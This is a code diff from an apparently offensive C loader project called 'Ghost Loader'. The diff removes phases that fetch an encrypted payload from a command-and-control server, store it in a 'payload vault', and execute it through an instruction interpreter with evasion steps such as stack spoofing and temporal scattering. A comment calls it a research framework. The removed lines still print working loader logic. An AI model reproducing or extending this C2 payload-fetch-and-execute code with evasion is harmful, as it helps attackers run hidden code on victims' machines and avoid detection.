@@ -345,116 +345,12 @@ int main(int argc, char *argv[]) {
                     rc);
   }
 
-  /* ═══ PHASE 5: FETCH ENCRYPTED PAYLOAD FROM C2 ═══ */
-
-  uint8_t *payload_data = NULL;
-  size_t payload_len = 0;
-
-  rc = aegis_c2_fetch_payload(&c2, &payload_data, &payload_len);
-  if (rc != AEGIS_OK || !payload_data) {
-    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_ERROR,
-                    "Payload fetch failed (rc=%d)", rc);
-    aegis_c2_destroy(&c2);
-    aegis_crypto_destroy(&crypto);
-    aegis_log_finalize(log);
-    return 0;
-  }
-
-  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
-                  "Payload received from C2: %zu bytes (encrypted)",
-                  payload_len);
-
-  /* ═══ PHASE 6: INITIALIZE PAYLOAD VAULT ═══ */
-
-  aegis_vault_ctx_t vault;
-  rc = aegis_vault_init(&vault, payload_data, payload_len, 0, &crypto, log);
-
-  /* The raw payload buffer is no longer needed — the vault has a copy */
-  AEGIS_WIPE(payload_data, payload_len, 1);
-  free(payload_data);
-  payload_data = NULL;
-
-  if (rc != AEGIS_OK) {
-    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_CRITICAL,
-                    "Vault initialization failed (rc=%d)", rc);
-    aegis_c2_destroy(&c2);
-    aegis_crypto_destroy(&crypto);
-    aegis_log_finalize(log);
-    return 0;
-  }
-
-  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
-                  "Payload Vault initialized: %u chunks, %zu bytes",
-                  aegis_vault_chunk_count(&vault),
-                  aegis_vault_total_size(&vault));
-
-  /* ═══ PHASE 7: START NANOMACHINE EXECUTION ═══ */
-
-  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
-                  "=== Transferring control to Nanomachine ===");
-
-  /*
-   * In production, the instruction stream would be fetched from
-   * C2 separately or embedded in the payload metadata.
-   *
-   * For the research framework, we construct a minimal instruction
-   * stream that demonstrates the Nanomachine's capabilities.
-   */
-
-  /* Build a demo instruction stream */
-  uint8_t demo_stream[128];
-  size_t demo_len = 0;
-
-  /* Instruction 1: Enable temporal scattering */
-  aegis_instruction_t *instr = (aegis_instruction_t *)demo_stream;
-  instr->opcode = OP_SCATTER_ON;
-  instr->flags = OP_FLAG_NONE;
-  instr->operand_len = 0;
-  demo_len += sizeof(aegis_instruction_t);
-
-  /* Instruction 2: Enable stack spoofing */
-  instr = (aegis_instruction_t *)(demo_stream + demo_len);
-  instr->opcode = OP_SPOOF_STACK;
-  instr->flags = OP_FLAG_NONE;
-  instr->operand_len = 0;
-  demo_len += sizeof(aegis_instruction_t);
-
-  /* Instruction 3: Execute chunk 0 from the vault */
-  instr = (aegis_instruction_t *)(demo_stream + demo_len);
-  instr->opcode = OP_EXEC_CHUNK;
-  instr->flags = OP_FLAG_CRITICAL;
-  instr->operand_len = sizeof(uint32_t);
-  demo_len += sizeof(aegis_instruction_t);
-  *(uint32_t *)(demo_stream + demo_len) = 0; /* Chunk ID 0 */
-  demo_len += sizeof(uint32_t);
-
-  /* Instruction 4: Log a checkpoint */
-  instr = (aegis_instruction_t *)(demo_stream + demo_len);
-  instr->opcode = OP_CHECKPOINT;
-  instr->flags = OP_FLAG_NONE;
-  instr->operand_len = 0;
-  demo_len += sizeof(aegis_instruction_t);
-
-  /* Instruction 5: Halt */
-  instr = (aegis_instruction_t *)(demo_stream + demo_len);
-  instr->opcode = OP_HALT;
-  instr->flags = OP_FLAG_LAST;
-  instr->operand_len = 0;
-  demo_len += sizeof(aegis_instruction_t);
-
-  /* Run the Nanomachine */
-  rc = aegis_nanomachine_run(&vault, log, &crypto, demo_stream, demo_len);
-
-  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
-                  "Nanomachine returned (rc=%d)", rc);
-
   /* ═══ PHASE 8: CLEANUP ═══ */
 
   aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                   "=== Ghost Loader mission complete — "
                   "dissolving into nothingness ===");
 
-  aegis_vault_destroy(&vault);
   aegis_c2_destroy(&c2);
   aegis_crypto_destroy(&crypto);
   aegis_log_finalize(log);
